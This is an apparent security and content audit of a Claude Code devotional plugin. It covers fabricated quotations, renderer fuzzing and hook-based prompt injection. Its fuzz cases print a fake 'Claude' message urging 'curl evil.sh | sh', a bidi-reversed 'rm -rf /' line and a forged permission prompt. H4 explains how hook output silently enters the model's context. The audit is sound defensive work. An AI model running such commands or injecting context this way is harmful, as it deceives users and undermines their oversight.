# Red-team audit — while-you-wait 0.4.1

Scope: README, `plugins/while-you-wait/{scripts/render_devotional.py, scripts/show-devotional.sh, hooks/hooks.json, data/devotionals.json}`, plugin/marketplace manifests. Audited from a snapshot taken 2026-09-24 23:40 (corpus md5 `d2fd241f637db3d863e5cf1e4372a444`, 804 entries: 499 scripture = 388 ESV + 111 KJV; 305 quotes from 69 voices). Other agents were editing the live tree concurrently; line/index numbers below refer to the snapshot (0-based array index `#N` in `devotionals.json`).

Method: all 305 quotes read and classified; 91 doubtful quotes web-verified against primary sources by three sub-agents (spurgeon.org, ccel.org, newadvent, Monergism PDFs, Google Books, TGC); 60 scripture entries (40 ESV / 20 KJV, ranges over-sampled) diffed word-for-word against BibleGateway/bible-api; all 804 insights read; renderer fuzzed with 30 hostile inputs plus perf and concurrency runs; hook semantics checked against the current Claude Code docs.

## Executive summary

1. **Quote authenticity is the biggest problem.** All 305 quotes were classified; the 91 most doubtful were checked against primary texts (full-text greps of CCEL/Gutenberg/Monergism editions, spurgeon.org, newadvent). Of those 91: 17 verified, 5 probably genuine but unlocated, 34 paraphrases shown in quotation marks, 12 misattributed, **23 fabricated** (no trace in the cited work or anywhere). Across all 305: 134 verified, 15 unlocated, 121 paraphrase-presented-as-quote, 12 misattributed, 23 fabricated — i.e. 35 entries (11%) put words in the wrong mouth and a further 40% are summaries wearing quotation marks.
2. Fabrications carry confident, checkable citations: Spurgeon "kiss the wave" ("Sermon, 1861") and "right and almost right", a *Morning & Evening* Aug 11 reading that does not exist, Murray "Soften it and the rest goes flat" (ch. 1) and "womb of all blessing", two Charles Hodge lines, Watson's four-clause "Bible is the book of God…", Goodwin's "robe loaned / robe given", two Manton sermons (one on a Psalm he never preached on), Luther "on Gal 2:20", Vos *Grace and Glory*, Lloyd-Jones *The Cross*, Packer *Quest for Godliness*, Piper *Brothers*, Carson *Gagging of God*, Vanhoozer, pseudo-Chrysostom "Statues II", Cyprian *On the Lord's Prayer*, Carmichael, Whitall Smith.
3. Misattributions include Scripture dressed as theologians (Job 36:26 as Berkhof; Ps 25:14 as Carmichael), Augustine as Aquinas (#592) and as Tozer (#791), Irenaeus as Athanasius (#162), John Wesley's Covenant Prayer as Susanna Wesley (#193), Steve Estes as Joni (#802), a 1989 CCM lyric as Spurgeon (#205 "trust his heart"), a 17th-c. Lutheran maxim as Luther (#180), Keller's *Walking with God* as *Reason for God* (#689), Carmichael's *Toward Jerusalem* as *Gold by Moonlight* (#213), and Warfield's 1909 essay as *Plan of Salvation* (#622).
4. Every Owen and Packer chapter number checked was wrong (#186, #608, #612, #219, #660), and Keller/Warfield/Augustine section refs are off; nine quotes are duplicated under two different refs, which also defeats the anti-repeat window.
5. **Scripture text is mostly exact** (37/60 exact, 16 punctuation-only) but 7/60 have word-level differences: three ranges silently drop their final clause (Gal 5:23 "against such things there is no law", Ps 95:7 "Today, if you hear his voice", Jer 9:24 "for in these things I delight"), Hab 3:17 elides half a verse behind "...", and four drop the framing clause. ESV count is **477 of Crossway's 500-verse cap (95.4%)**, with no Crossway copyright notice anywhere in the repo.
6. **Insights**: 156/305 quote insights use the template "Reformed *X* (with *Y*) reads/hears/agrees…", 15 quote insights call the quotation "this verse", 26 lean on developer tie-ins, and several embed their own fabricated sub-quotes (Edwards #266, Spurgeon #268, Luther #325, Kepler #20) or factual errors (Kierkegaard #71, Hebrews as Pauline #573, Smalcald dating #606, "only Father besides John" #168).
7. **Renderer** never crashed or blocked (30/30 hostile inputs exit 0; 35 ms/run at 804 entries, 48 ms at 4,000). But `clean()` strips `\n`/`\t` so multi-line entries are glued ("hymnLine two"), while U+202E bidi overrides, zero-width and format characters, box-drawing and "⏺ Claude:" prefixes pass straight into `systemMessage`; a `null` field or `width: Infinity` silently kills the render; concurrent runs lose state updates (window shrank 15→5).
8. **Wrapper**: `set -u` and every exit path return 0 — good for the prompt — but a renderer that prints non-JSON to stdout and dies (tested: `print("HELLO CONTEXT"); exit(3)`) is forwarded as exit-0 plain text, which for `UserPromptSubmit` Claude Code **adds to Claude's context**. The wrapper thus converts any renderer regression or malicious change into a silent prompt-injection channel.
9. **Supply chain**: users track the GitHub repo; a version bump in `plugin.json` (or auto-update, if enabled) ships arbitrary bash on every prompt with the user's privileges, with no sha pinning, signature or review step. Nothing in `hooks.json`/`plugin.json` widens the blast radius beyond that baseline, but the CI check only asserts "some systemMessage string", not "no other output / no additionalContext / no decision".
10. Recommended before 0.5: purge or re-source the fabricated/misattributed rows (list in Appendix A), add a Crossway notice and an ESV-count guard to `validate-corpus.py`, strip bidi/format characters and preserve newlines in `clean()`, reject non-JSON stdout in the wrapper, and pin the marketplace source to a sha.

## Findings by severity

Severity key: **critical** = ships something false or harmful to every user with no mitigation; **high** = materially undermines the plugin's stated purpose or trust; **medium** = real but bounded; **low** = cosmetic / edge case.

### Critical

None. Nothing found allows code execution from the corpus, and no hostile input blocked a prompt.

### High

**H1 — Fabricated quotations attributed to real theologians (corpus).** Zero-trace in primary texts after full-text grep of the cited works where available:

| idx | voice | ref as shipped | what the check found |
|---|---|---|---|
| 744 | John Murray | Redemption Accomplished and Applied (1955), ch. 1 | "Soften it and the rest goes flat" — no hits anywhere; not Murray's register |
| 747 | John Murray | Collected Writings, vol. 2 | "womb of all blessing" — no hits |
| 737 | Charles Hodge | Systematic Theology vol. 1 | "lift up the soul and transform it" — no hits; grep of Monergism PDFs negative |
| 739 | Charles Hodge | The Way of Life (1841) | grep of 306-page PDF: zero hits for "highest type" / "most Christ-like" |
| 796 | Amy Carmichael | Edges of His Ways (1955) | first clause is Ps 25:14 KJV; second sentence untraceable |
| 798 | Hannah Whitall Smith | The God of All Comfort (1906) | CCEL full text checked; absent |
| 204 | Charles Spurgeon | "Sermon, 1861" | "kiss the wave" — Spurgeon Library "6 Quotes Spurgeon Didn't Say"; the 1861 date is invented |
| 697 | Thomas Goodwin | Christ Set Forth (1642) | "not a robe loaned, but a robe given" — Monergism PDF grep "robe"/"loaned" = 0; modern composite |
| 702 | Thomas Watson | A Body of Divinity (1692) | CCEL full text: absent; four-clause modern composite |
| 206 | Charles Spurgeon | "Sermon" | "right and almost right" — no source in any Spurgeon work; PuritanBoard/Logos researchers: spurious |
| 208 | Charles Spurgeon | Morning and Evening, August 11 | Aug 11 AM/PM readings contain nothing like it; CCEL full-text grep of the whole book negative |
| 209 | Charles Spurgeon | "Sermons" | no hit on spurgeon.org / CCEL / web |
| 228 | D.A. Carson | The Gagging of God, ch. 1 | no trace in Carson or reviews |
| 231 | Kevin Vanhoozer | The Drama of Doctrine, ch. 1 | "faith seeking understanding seeking obedience" appears nowhere; Vanhoozer's play is "faith *speaking* understanding" |
| 598 | Martin Luther | Commentary on Galatians (1535), on 2:20 | not in Gutenberg / Project Wittenberg texts; nearest genuine is on 2:4-5 and differs |
| 630 | Geerhardus Vos | Grace and Glory (1922) | archive.org full text: zero hits |
| 650 | Martyn Lloyd-Jones | The Cross (1986) | no hit on mljtrust.org or anywhere |
| 665 | J.I. Packer | A Quest for Godliness, Introduction | no trace |
| 680 | John Piper | Brothers, We Are Not Professionals | no trace; contradicts Piper's actual position on paid ministry |
| 709 | Thomas Manton | Sermons on Psalm 119, Sermon I | not in Works vol. VI; the maxim is Jerome, Ep. 22.25 |
| 711 | Thomas Manton | Sermon on Psalm 23 | Manton's Works contain no sermon on Psalm 23 |
| 719 | John Chrysostom | Homilies on the Statues, II | no trace in any Chrysostom text |
| 723 | Cyprian | On the Lord's Prayer (252) | newadvent full text grepped: nothing resembling it |

Repro: `python3 -c "import json;d=json.load(open('plugins/while-you-wait/data/devotionals.json'));print(d[744])"`. Impact: the plugin's whole value proposition is trustworthy devotional text; a user who repeats one of these in a sermon or essay is misled, and the confident fake refs make it worse than an "attributed" label would.

**H2 — Misattributed quotations.** Words belong to someone else (correct source in brackets):

- #748 Berkhof → **Job 36:26 KJV** ("Behold, God is great, and we know him not").
- #791 Tozer, *God's Pursuit of Man* → **Augustine, Confessions I.1**, which Tozer quotes in *The Pursuit of God* ch. 3 (wrong author and wrong book).
- #592 Aquinas, ST II-II.27.2 → **Augustine, De Doctrina Christiana III.10.16** (the classic definition of *caritas*, quoted by Lombard and Aquinas).
- #162 Athanasius, De Inc. 54 → wording is **Irenaeus, Adv. Haer. V pref.** ("became what we are that He might bring us to be what He is"); Athanasius' actual line is "He became man that we might become god".
- #193 Susanna Wesley → **John Wesley's Covenant Service (1755), adapted from Richard Alleine (1663)**; *A Plain Account of the People Called Methodists* (1749) does not contain it. The voice string itself ("her sons John & Charles drew from her") is an invented rationale.
- #802 Joni Eareckson Tada → **Steve Estes** (Joni credits him explicitly; she popularised the line).
- #742 A.A. Hodge, *Confession of Faith* → nearest real line is **Charles Hodge, Princeton Sermons**; the shipped sentence is unlocated.
- #718 Chrysostom, Hom. Matt 51 → floating internet quote; not in Hom. Matt 51 and not in the Liturgy-of-Hours "Homily 6 on Prayer" either; source unlocated (drop the ref).
- #205 Spurgeon "trust his heart" → **Babbie Mason / Eddie Carswell song "Trust His Heart" (1989)**; Spurgeon's line is "trusts him where he cannot trace him".
- #180 Luther "article on which the church stands or falls" → **Balthasar Meisner (1615) / Alsted (1618)**; ref honestly says "tradition" but the insight treats it as Luther's.
- #689 Keller → exact wording, but from ***Walking with God through Pain and Suffering* (2013), ch. 1**, not *The Reason for God*.
- #213 Carmichael → "In acceptance lieth peace" is her poem in ***Toward Jerusalem* (1936)**, not *Gold by Moonlight*; the first sentence is untraceable.
- #163 Irenaeus "man fully alive" → Latin is *gloria Dei vivens homo*; "fully alive" is a 20th-c. gloss.
- #165 Tertullian → actual: *semen est sanguis Christianorum* ("the blood of Christians is seed"); "martyrs…of the Church" is the popular paraphrase.
- #175 Calvin, Inst. I.11.8 → Calvin says *hominis ingenium* (mind/nature) is the idol factory, not "heart".
- #179 Luther → "Here I stand, I can do no other" is absent from the earliest Worms transcripts (disputed addition); the rest is genuine.
- #622 Warfield → "The Calvinist is the man who sees God" is from the essay *Calvinism* (1908/9), not *The Plan of Salvation* (1915).

**H3 — Scripture ranges labelled as full verses but silently truncated (corpus).** From the 60-verse diff (Appendix B): #106 Gal 5:22-23 drops "; against such things there is no law."; #260 Ps 95:6-7 drops "Today, if you hear his voice,"; #543 Jer 9:23-24 (KJV) drops ": for in these things I delight, saith the LORD."; #65 Hab 3:17-18 replaces the middle of v.17 with "..." (the only ellipsis in the corpus). Four more drop their narrative frame (#44 Isa 6:3 "And one called to another and said:", #68 Zech 4:6 "Then he said to me, 'This is the word of the LORD to Zerubbabel:'", #294 Matt 6:9 "Pray then like this:", #505 2 Sam 22:2 "And he said,"). At 7/60 (11.7%) the expected number of affected entries across 499 is ~55. Fix: label partial verses `a`/`b`, or include the clause. Repro: compare `d[106]['text']` with ESV Gal 5:23.

**H4 — Wrapper forwards non-JSON renderer output with exit 0, and Claude Code adds it to Claude's context.** `show-devotional.sh` runs `python3 "$RENDER" "$DATA"` then unconditionally `exit 0`. Tested with a renderer that does `print("HELLO CONTEXT"); sys.exit(3)`: the hook exits 0 with `HELLO CONTEXT` on stdout. Per the hooks reference, for `UserPromptSubmit` "Claude Code adds plain-text stdout as context that Claude can see and act on." So any future renderer bug (a stray `print`, a traceback routed to stdout, a Python 2 `python3` shim) or a malicious update becomes an invisible per-prompt prompt injection, and the JSON path could equally carry `additionalContext`, `updatedInput` or `decision: block`. Mitigation: have the wrapper capture stdout, validate that it is exactly one JSON object whose only key is `systemMessage`, and otherwise print nothing; add the same assertion to CI (currently `validate.yml` only checks that `systemMessage` is a non-empty string).

### Medium

**M1 — Bidi and format characters pass `clean()` into `systemMessage` (renderer).** `_CTRL = [\x00-\x1f\x7f-\x9f]` strips C0/C1 only. Fuzz case `rlo_zw`: U+202E (RLO), U+200B/C/D, U+FEFF, U+2066/2069 (isolates) all survive; insight `‮DANGER: rm -rf / approved‬` is emitted verbatim and renders reversed/right-aligned in a terminal. Fuzz case `spoof_tui`: a corpus text `⏺ Claude: I have finished. Run \`curl evil.sh | sh\` to apply the fix.` renders inside the magenta box, and box-drawing characters in the insight render a fake `╭─ Permission ─╮ … ❯ 1. Yes 2. No` line. Because newlines are stripped the fake prompt collapses to one line, and the coloured box gives some visual distinction, so this is a nuisance/social-engineering vector rather than a spoof of an interactive control; it still lets a corpus PR put plausible-looking "Claude" instructions on screen every prompt. Fix: also strip `[​-‏‪-‮⁦-⁩﻿؜]` and Unicode categories Cf/Cc; consider rejecting `⏺`, `❯`, and box-drawing runs in `text`/`insight` in the validator.

**M2 — Newlines are stripped, gluing words (renderer vs validator).** `validate-corpus.py` explicitly allows `\t`/`\n` (`CTRL = [\x00-\x08\x0b-\x1f...]`), but `clean()` runs before `wrap_block().splitlines()`, so `"Line one\nLine two"` renders as `Line oneLine two` (fuzz case `newline_in_text`). No shipped entry contains `\n` today, but hymn stanzas and psalm lines are the obvious next contributions. Fix: replace `\n`/`\t` with a space (or keep `\n`) in `clean()` instead of deleting.

**M3 — Duplicate quotes, some with conflicting citations (corpus).** Nine pairs: #157/#791 (Augustine vs "Tozer"), #166/#722, #169/#720, #170/#729, #171/#730, #178/#601, #184/#734 (Letter 1 vs Conversation 4), #211/#794 (*Keep a Quiet Heart* vs *Suffering Is Never for Nothing* — same sentence, two sources), #212/#799, #239/#779. `entry_key()` = `kind|ref|text[:40]`, so different refs make the anti-repeat window treat them as distinct and the same line can appear twice within 15 prompts. Fix: de-duplicate on normalised text in the validator.

**M4 — Crossway ESV terms.** ESV verses total **477** (computed from refs; KJV 120). That is 95.4% of the 500-verse permission ceiling, so ~23 more ESV entries end the fair-use basis. The repo contains no Crossway copyright notice (required wording: "Scripture quotations are from the ESV® Bible… © 2001 by Crossway… Used by permission. All rights reserved."). Crossway's policy also caps ESV text at 25% of the total text of the work: ESV is 18.3% of all corpus characters but 48.2% of the quoted `text` fields — arguable, and worth a note. Fix: add the notice to README/plugin.json, and a hard `≤ 500` ESV-verse assertion to `validate-corpus.py`.

**M5 — Wrong chapter/section citations on genuine quotes.** #186 Owen → ch. 7 (not I.2); #608 Owen → ch. 14 (not 7); #612 Owen → ch. 2 (not 1); #219 Packer → ch. 3 and #660 Packer → ch. 1 (swapped); #686 Keller → Part One ch. 1/2 (not Preface); #687 Keller → Introduction (not ch. 4); #160 Augustine → Sermon 43 §1 (not §7); #754 Hoekema → ch. 5 (not 1); #647 Lloyd-Jones → ch. 5; #207 Spurgeon → *The Ravens' Cry*, 14 Jan 1866 (not 1865); #661 Packer → ch. 9 is "God Only Wise" (title given is ch. 10); #669 Spurgeon → *Salvation to the Uttermost*, 1856 (not 1879); #214 Whitall Smith → ch. 15 (not 6); #726 Tertullian → *De oratione* ch. 17 (not §1); #693 Sibbes → ch. 2. Words are right (or close), so the fix is editorial.

**M6 — Insight factual errors.** #71 Matt 5:8: Kierkegaard's *Purity of Heart* is on James 4:8, not this beatitude. #573 Hab 2:4: "Paul quotes three times (Rom 1:17, Gal 3:11, Heb 10:38)" — Hebrews is not Pauline in any Reformed/evangelical commentary (Calvin included). #606: "Luther agreed nine years before Calvin's Institutes" — Smalcald Articles (1537) post-date the 1536 Institutes. #168: Gregory is not "the only Father besides John" called Theologian (Symeon the New Theologian). #240 WSC Q1 is misquoted ("The chief end of man is…" vs "Man's chief end is to glorify God, and to enjoy him for ever") — confessional texts should be verbatim. #325 "eight words of prayer" — ESV has seven, Greek six. #360 "Paul invents a word" (ὑπερνικάω is merely rare). #582 Mal 4:2 "the last messianic prophecy of the OT" (4:5-6 follows). Embedded sub-quotes with no source: #20 Kepler "thinking God's thoughts after Him" (apocryphal wording), #257 "Augustine read his whole Confessions out of this one verse", #266 Edwards "God is glorified in the saints' afflictions…", #268 Spurgeon "deliver me from being knowing…" (garbled), #325 Luther "the only prayer the unjustified can pray", #298 "Bonhoeffer drew steadiness from this verse under Hitler", #359 "Spurgeon called this verse the believer's logic", #490 "Spurgeon preached this verse often".

**M7 — Insight quality: template filler.** 199 insights (156 of 305 quote insights) match `Reformed <discipline> (with <Name>) reads/hears/agrees/holds…`, e.g. #767 "Reformed soteriology with Ferguson reads every benefit downstream of union". Fifteen quote insights call a quotation "this verse"/"the verse" (#185, #196, #200, #212, #643, #649, #650, #659, #661, #667, #693, #720, #727, #732, #756). Twenty-six insights use developer tie-ins ("your next code review", "worst commit of your career", "before the deploy", "this very keystroke", "the lungs that complete this prompt"), 24 of them in scripture entries — see list under C. Forty-one insights run to 4–5 sentences (README promises "1–2 sentence reflection"); longest is #193 at 355 chars/4 sentences.

**M8 — State-file race (renderer).** `save_recent()` does a non-atomic `open(..., "w")`. 40 concurrent runs × 5 rounds: no crash, no invalid JSON, but in round 3 the window shrank from 15 to 5 entries (lost update from a reader that saw a partially-written file and reset to `[]`). Real-world trigger: two Claude Code sessions (or Claude Code + Codex with a shared path) submitting prompts in the same instant. Fix: write to a temp file and `os.replace()`.

**M9 — Renderer trusts the validator (renderer).** Fuzz: `"insight": null`, `"text": 12345`, `"text": ["a"]`, `"text": {"a":1}`, `"ref": 7` each produce **no output** (AttributeError caught by the top-level `except`), and the state file is updated before render, so a single bad entry costs one silent prompt each time it is drawn. `"width": Infinity` in the user config raises `OverflowError` (not in the `except (ValueError, TypeError)`) and kills every render. Non-string items in a hand-edited state file are stringified and persist (`"{'x': 1}"`), permanently eating window slots.

### Low

- **L1** ` `/` ` act as line breaks (`splitlines()`), U+0085 is stripped — harmless, but inconsistent with M2.
- **L2** Width is measured in code points: CJK/emoji lines overflow the box (fuzz `emoji_cjk`); combining sequences are fine. Unbreakable tokens longer than `width` overflow at 40 and 100 (`break_long_words=False`); cosmetic since content lines have no right border.
- **L3** 50 KB `text` renders in 38 ms and emits a 50 KB `systemMessage`; nothing caps entry size. A validator cap (e.g. 1,500 chars) would stop an accidental paste.
- **L4** ESV double quotes are converted to single quotes throughout; closing quotes are added where the ESV quotation continues (#300, #315); periods are added to mid-sentence excerpts (#90, #317); small-caps LORD is flattened to "Lord" in KJV (7/20 sampled) — a literal case change against the public-domain text.
- **L5** Voice strings with parentheticals render raw as attribution lines ("— Susanna Wesley (her sons John & Charles drew from her)", "— Jim Elliot (per Elisabeth Elliot)").
- **L6** #221 Piper "Don't waste your life." is a book title presented as a quotation.
- **L7** The Claude Code wrapper does not drain stdin (the Codex one does). Tested with 300 KB on stdin: no block (`0.05 s`), because the renderer exits before the pipe matters. Fine today; would matter if the renderer ever waited.
- **L8** `readonly` state path, state path = directory, state dir = file, corrupt/dict/BOM/truncated JSON corpus: all exit 0 with either a correct render or silent skip. Confirmed good.
- **L9** Hook has no explicit `timeout`; default for `UserPromptSubmit` is 30 s. Renderer is ~35 ms so fine, but `afplay` via `Popen` is fire-and-forget and will outlive the hook — intended.

## C. The 25 worst insights (ref — problem)

1. #748 Berkhof — insight explains a "Berkhof" line that is Job 36:26.
2. #791 Tozer — "Tozer echoing Augustine": the quote *is* Augustine, verbatim.
3. #71 Matthew 5:8 — Kierkegaard book is on James 4:8 (factual).
4. #573 Habakkuk 2:4 — Hebrews attributed to Paul (factual).
5. #606 Calvin III.11.1 — Smalcald 1537 called "nine years before" the 1536 Institutes (factual).
6. #168 Gregory of Nazianzus — "only Father besides John" (factual); quote itself a composite.
7. #240 WSC Q1 — confessional text misquoted; insight built on the paraphrase.
8. #325 Luke 18:13 — "eight words" wrong; fabricated Luther sub-quote.
9. #268 Psalm 131 — garbled "Spurgeon" sub-quote ("deliver me from being knowing…").
10. #266 Psalm 119:71 — fabricated Edwards sub-quote.
11. #257 Psalm 63:1 — "Augustine read his whole Confessions out of this one verse" (unsupported).
12. #20 Psalm 19:1 — apocryphal Kepler wording presented as quote.
13. #131 Hebrews 11:1 — "cloud of witnesses cheers you on through this very keystroke" (12:1, and the witnesses are testifiers not spectators; plus tie-in).
14. #347 Acts 16:31 — "belief in the Person, not in propositions about him" contradicts #639 Machen in the same corpus; theologically loose for a Reformed voice.
15. #529 Ecclesiastes 7:20 — "Total depravity proven in two lines" (category error: universal sinfulness ≠ total depravity).
16. #2 Leviticus 19:2 — "Imitation flows from imputation" (conflates sanctification with justification vocabulary).
17. #533 Isaiah 1:18 — "God's invitation to negotiate forgiveness".
18. #535 Isaiah 12:2 — "the Lord has become both verb and noun of rescue" (filler).
19. #526 Job 42:5-6 — "Reformed mysticism (if there is such a thing)".
20. #93 Romans 8:28 — "the failing test, the rejected PR, the delayed feature" (tie-in; also the README's showcase example).
21. #34 Psalm 150:6 — "The lungs that complete this prompt are on loan".
22. #55 Lamentations 3:22-23 — "the morning after the worst commit of your career".
23. #767 Ferguson — pure template: "Reformed soteriology with Ferguson reads every benefit downstream of union".
24. #659 Bonhoeffer — "hears here the verse from 1 John 1:9 in dogmatic statement" (calls a quote a verse; garbled).
25. #193 Susanna Wesley — four sentences of biography built on a misattribution.

Developer tie-in count (strict word list, hand-checked): **26** entries — #0, 3, 8, 33, 34, 36, 37, 39, 40, 41, 55, 93, 107, 114, 119, 120, 131, 137, 235, 267, 271, 278, 281, 301, 577, 661. "Prompt" appears in 5 of them; "PR"/"commit"/"deploy"/"build script"/"debugging" in 6.

## D. Renderer and hook behaviour (fuzz results)

Harness: `scratchpad/redteam/fuzz/run.py` against a snapshot copy of `render_devotional.py`; each case is a separate corpus + state + config file. All cases exit 0.

| case | result |
|---|---|
| 50 KB unbroken text | 38 ms; one 50,000-char line inside the box; 50.8 KB systemMessage |
| 50 KB spaced text | 42 ms; wraps correctly; 82 KB systemMessage |
| `text` int / list / dict, `ref` int, `insight` null | **no output** (silent skip); state still updated |
| `kind` int | rendered as "scripture" label / gold |
| `themes` string | ignored, renders fine |
| emoji + CJK | renders; width counted in code points so lines visually overflow |
| combining chars (Zalgo) | renders; harmless |
| U+202E / U+200B-D / U+FEFF / U+2066-9 | **pass through** into systemMessage |
| CSI without ESC (`[31m`), C1 U+009B | literal `[31m` shown; U+009B stripped |
| real ESC / BEL / OSC | ESC and BEL stripped; residue `[2J[H]0;pwned` shown as text |
| "⏺ Claude: …" text + box-drawn fake permission prompt in insight | rendered (single line, inside coloured box) |
| `{"decision":"block"}` inside text | rendered as text; JSON output still well-formed (json.dumps escapes) |
| `\n` in text | **glued**: "Line one of the hymnLine two of the hymn" |
| U+2028/2029/U+0085 | 2028/2029 break lines; 0085 stripped |
| width 40 / 100 with 120-char token | overflows box on both; no crash |
| empty array / non-array / non-dict items | no output |
| corrupt JSON / BOM-prefixed JSON | no output (BOM: `json.load` fails → silent) |
| config `width: Infinity` | **no output** (OverflowError escapes `load_config`) |
| config `width:"abc"`, `mode:[...]`, `sound:"yes"`, `sound_file:123` | defaults applied; renders |
| corrupt / dict / weird-item state | recovers; weird items stringified and kept |
| read-only state file, state path is dir, state dir is file | renders; state not saved |
| 804-entry corpus ×20 | mean 35.4 ms (python startup 18.5 ms) |
| 4,000-entry corpus (1.9 MB) ×20 | mean 48.3 ms, max 112 ms |
| 40 concurrent runs ×5 rounds, shared state | 0 failures, JSON always valid, **window truncated 15→5 in one round** |
| wrapper: `CLAUDE_PLUGIN_ROOT` unset / nonexistent / python3 missing / stdout closed / `HOME` unset / 300 KB stdin | exit 0 every time; `HOME` unset still renders (state path falls back to `~` expansion of literal) |
| wrapper: renderer prints text and exits 3 | **exit 0 with plain text on stdout** (see H4) |

TUI-spoof assessment: the hook cannot inject ESC sequences (stripped) and cannot produce multi-line forgeries (newlines stripped), so it cannot draw a convincing permission dialog. It *can* put a bidi-reversed or "⏺ Claude:"-prefixed instruction on screen inside the devotional box. Risk is social-engineering only; no input is captured.

## E. Supply chain / trust

- **What a malicious corpus PR can do:** anything in M1 (on-screen forgery, bidi tricks), plus fabricated theology. It cannot execute code and cannot reach Claude's context — `systemMessage` is user-only — *as long as the renderer stays honest*.
- **What a malicious renderer/wrapper PR (or repo compromise) can do:** run arbitrary bash on every prompt with the user's privileges; inject `additionalContext`/`updatedInput`/plain stdout into the model's context invisibly (H4); block prompts (`decision: block`); exfiltrate via the `afplay` path or any subprocess. Delivery: users installed from `Matthew-Slaughter/while-you-wait` track the repo; a `version` bump in `plugin.json` is all that is needed for `/plugin marketplace update` (or background auto-update, if the user enabled it) to fetch and run the new code. The marketplace entry uses a relative `source` with no `ref`/`sha`, and there is no signing or review step in Claude Code's model.
- **hooks.json / plugin.json:** minimal and correct — one `UserPromptSubmit` command hook, `${CLAUDE_PLUGIN_ROOT}` path, no extra permissions, no MCP servers, no `command` source. Nothing widens the blast radius; the risk is the baseline Claude Code plugin trust model, plus H4 which removes the one place the plugin could have been defensive.
- **Concrete hardening:** (1) wrapper validates stdout is exactly `{"systemMessage": <str>}`; (2) CI asserts the same and asserts no `additionalContext`/`decision` keys; (3) publish releases from tags and point the marketplace `source` at a tagged `github` source with `sha`; (4) keep `version` bumped only on reviewed releases; (5) document in README that plugin updates execute code.


## Appendix A — Quote authenticity table (all 305 `kind: quote` entries)

Verdict legend: **verified** = wording found in the cited work (web-checked, with evidence); **verified (well-known text)** = exact or standard-translation wording of a text the auditor knows first-hand, not re-fetched; **probably-genuine-but-unlocated**; **paraphrase-presented-as-quote** = the author's idea in modern summary wording, shown in quotation marks; **misattributed** (correct source given); **fabricated** = no trace in the cited work or anywhere. `src` = web (sub-agent primary-source check) or desk (auditor classification by ref specificity and known text). Entries marked desk/paraphrase without a note were classified by wording style and ref vagueness only.

Totals (305): verified 134 (web 17, desk 117), unlocated 15, paraphrase 121, misattributed 12, fabricated 23. Web-checked subset (91): verified 17, unlocated 5, paraphrase 34, misattributed 12, fabricated 23.

| idx | voice | ref (as shipped) | verdict | src | evidence / note |
|---|---|---|---|---|---|
| 157 | Augustine | Confessions, I.1 | verified (well-known text; not web-checked in this audit) | desk |  |
| 158 | Augustine | Confessions, X.27 | verified (well-known text; not web-checked in this audit) | desk |  |
| 159 | Augustine | Confessions, X.29 | verified (well-known text; not web-checked in this audit) | desk |  |
| 160 | Augustine | Sermons, 43.7 | verified | web | Sermon 43 §1 (not §7): 'Est autem fides credere quod nondum vides…' |
| 161 | Augustine | Contra Faustum, XVII.3 | verified | web | Contra Faustum 17.3 (NPNF): 'to believe what you please… is to believe yourselves, and not the gospel' — corpus is the popular loose rendering |
| 162 | Athanasius | On the Incarnation, §54 | misattributed | web | Irenaeus, Adv. Haer. V pref.; Athanasius De Inc. 54 reads 'He was made man that we might be made God' |
| 163 | Irenaeus of Lyons | Against Heresies, IV.20.7 | paraphrase-presented-as-quote | web | Latin 'gloria Dei vivens homo'; 'fully alive' is a modern gloss |
| 164 | Polycarp of Smyrna | The Martyrdom of Polycarp, IX | verified (well-known text; not web-checked in this audit) | desk | Mart. Pol. 9.3 |
| 165 | Tertullian | Apologeticus, 50 | paraphrase-presented-as-quote | web | Apol. 50.13 'semen est sanguis Christianorum'; 'martyrs… of the Church' is the loose traditional rendering |
| 166 | Cyprian of Carthage | On the Unity of the Church, 6 | verified (well-known text; not web-checked in this audit) | desk | De unitate 6 (Habere iam non potest Deum patrem…) |
| 167 | Basil the Great | Homily on Luke 12 (I Will Tear Down My Barns) | verified (well-known text; not web-checked in this audit) | desk | Homily 6 'I will tear down my barns' (close translation) |
| 168 | Gregory of Nazianzus | Theological Orations, 31 | paraphrase-presented-as-quote | web | neither clause is in Or. 31 (newadvent); genuine 31.14/31.28 wording differs; 'cannot grasp' is Or. 40.41 |
| 169 | John Chrysostom | last words, AD 407 | verified (well-known text; not web-checked in this audit) | desk | Palladius, Dialogue |
| 170 | Anselm of Canterbury | Proslogion, ch. 1 | verified (well-known text; not web-checked in this audit) | desk | Proslogion 1 exact |
| 171 | Anselm of Canterbury | Cur Deus Homo, I.21 | verified (well-known text; not web-checked in this audit) | desk | CDH I.21 exact |
| 172 | Thomas Aquinas | Two Precepts of Charity, prologue | verified | web | De duobus praeceptis caritatis prologue: 'Tria sunt homini necessaria ad salutem…' |
| 173 | Thomas Aquinas | Summa Theologiae, II-II.23.8 | verified (well-known text; not web-checked in this audit) | desk | ST II-II.23.8 exact |
| 174 | John Calvin | Institutes, I.1.1-2 | verified (well-known text; not web-checked in this audit) | desk | I.1.1-2 heading paraphrase, faithful |
| 175 | John Calvin | Institutes, I.11.8 | paraphrase-presented-as-quote | web | Latin 'hominis ingenium… idolorum fabricam' — mind/nature, not heart |
| 176 | John Calvin | Institutes, III.7.1 | verified (well-known text; not web-checked in this audit) | desk | III.7.1 exact |
| 177 | John Calvin | Institutes, I.6.2 | verified | web | Battles I.6.2: 'all right knowledge of God is born of obedience' |
| 178 | Martin Luther | Ninety-Five Theses, #1 | verified (well-known text; not web-checked in this audit) | desk | Thesis 1 exact |
| 179 | Martin Luther | Diet of Worms, 1521 | verified | web | first sentence in the Reichstag record; 'Here I stand, I can do no other' absent from transcript (later Wittenberg addition) |
| 180 | Martin Luther | tradition (paraphrasing Luther) | misattributed | web | maxim first attested Meisner 1615 / Alsted 1618; nearest Luther WA 40/3:352 'stante enim hac doctrina stat Ecclesia' |
| 181 | Richard Sibbes | The Bruised Reed, ch. 1 | paraphrase-presented-as-quote | web | first sentence is the sermon text (Isa 42:3); second sentence not in the book (full-text grep) |
| 182 | Thomas Goodwin | The Heart of Christ in Heaven Towards Sinners on Earth | paraphrase-presented-as-quote | web | genuine idea (Part I: 'his heart… remains the same it was on earth'); wording modern |
| 183 | Stephen Charnock | The Existence and Attributes of God, Discourse I | paraphrase-presented-as-quote | web | not in Discourse I (grep); genuine: 'we cannot know him perfectly, yet… cannot be totally ignorant of him' |
| 184 | Brother Lawrence | Practice of the Presence of God, Letter 1 | paraphrase-presented-as-quote | desk | (unchecked; treated as paraphrase by default — modern-summary wording) |
| 185 | John Owen | The Mortification of Sin | verified (well-known text; not web-checked in this audit) | desk | Mortification ch. 2: 'be killing sin or it will be killing you' |
